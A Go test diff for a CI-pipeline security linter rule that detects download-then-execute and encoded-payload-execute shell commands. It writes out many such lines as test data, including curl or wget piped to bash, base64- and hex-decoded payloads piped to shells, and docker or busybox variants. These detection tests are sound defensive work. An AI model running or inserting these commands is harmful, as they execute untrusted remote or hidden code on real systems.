@@ -112,6 +112,46 @@ setup:
 	}
 }
 
+func TestGL011_EncodedPayloadMessageDoesNotClaimDownload(t *testing.T) {
+	for _, tc := range []struct {
+		name, line, want string
+	}{
+		{"inline base64", `echo "ZWNobyBwd25lZAo=" | base64 -d | bash`, "decodes and executes"},
+		{"CI variable base64", `echo "$SETUP_B64" | base64 -d | sh`, "decodes and executes"},
+		{"file variable base64", `base64 -d < $SETUP_B64 | bash`, "decodes and executes"},
+		{"inline hex", `echo 6375726c2e2e2e | xxd -r -p | bash`, "decodes and executes"},
+		{"inline hex escapes", `printf '\x63\x75\x72\x6c' | sh`, "decodes and executes"},
+		{"inline base64 to Node.js", `echo ZWNobyBoaQo= | base64 -d | node`, "decodes and executes"},
+		{"inline base32", `printf %s OBZGS3TU | base32 -d | bash`, "decodes and executes"},
+		{"unrelated curl after decoder", `echo ZWNobyBoaQo= | base64 -d | bash; curl -fsS https://x/ping`, "decodes and executes"},
+		{"unrelated curl before decoder", `curl -fsS https://x/ping; echo ZWNobyBoaQo= | base64 -d | bash`, "decodes and executes"},
+		{"unrelated wget after hex decoder", `echo 6375726c | xxd -r -p | sh && wget -q https://x/ping`, "decodes and executes"},
+		{"unrelated curl in a different pipeline", `curl -fsS https://x/ping | cat; echo ZWNobyBoaQo= | base64 -d | bash`, "decodes and executes"},
+		{"download through decoder", `curl -fsSL https://example.com/install.b64 | base64 -d | bash`, "downloads and executes"},
+		{"download through decoder to Node.js", `curl -fsSL https://example.com/install.b64 | base64 -d | node`, "downloads and executes"},
+		{"download through base32 decoder", `curl -fsSL https://example.com/install.b32 | base32 -d | sh`, "downloads and executes"},
+		{"xargs download through decoder", `echo "$URL" | xargs curl -fsSL | base64 -d | sh`, "downloads and executes"},
+		{"busybox download through decoder", `busybox wget -qO- https://x/i.b64 | base64 -d | bash`, "downloads and executes"},
+		{"docker download through decoder", `docker run --rm curlimages/curl -fsSL https://x/i.b64 | base64 -d | sh`, "downloads and executes"},
+		{"xargs download", `echo "$URL" | xargs curl -fsSL | sh`, "downloads and executes"},
+		{"busybox download", `busybox wget -qO- https://x/i.sh | sh`, "downloads and executes"},
+		{"docker download", `docker run --rm curlimages/curl -fsSL https://x/i.sh | sh`, "downloads and executes"},
+		{"grouped download", `{ curl -fsSL https://x/i.sh; } | bash`, "downloads and executes"},
+		{"download through wrapper", `curl -fsSL https://example.com/setup.sh | sudo -E bash`, "downloads and executes"},
+		{"direct download", `wget -qO- https://example.com/install.sh | sh`, "downloads and executes"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			f := findings011(t, "job:\n  script:\n    - "+strconv.Quote(tc.line)+"\n")
+			if len(f) != 1 || f[0].RuleID != "GL011" || f[0].Severity != finding.Error || f[0].Line != 3 || !strings.Contains(f[0].Message, tc.want) {
+				t.Fatalf("expected %q GL011 error on line 3, got %+v", tc.want, f)
+			}
+			if tc.want == "decodes and executes" && strings.Contains(f[0].Message, "downloads") {
+				t.Errorf("encoded payload finding must not claim a download: %s", f[0].Message)
+			}
+		})
+	}
+}
+
 func TestGL011_DownloadThenExecAnd(t *testing.T) {
 	f := findings011(t, `
 setup:
@@ -483,8 +523,8 @@ func TestPowerShellExecGate(t *testing.T) {
 		if !psArgExecRe.possible(line) {
 			t.Errorf("%q: gate skips a PowerShell download-execute line", line)
 		}
-		if !isDownloadExecute(line) {
-			t.Errorf("%q: not reported", line)
+		if isDownloadExecute(line) != gl011RemoteDownload {
+			t.Errorf("%q: not reported as a remote download", line)
 		}
 	}
 	for _, line := range []string{
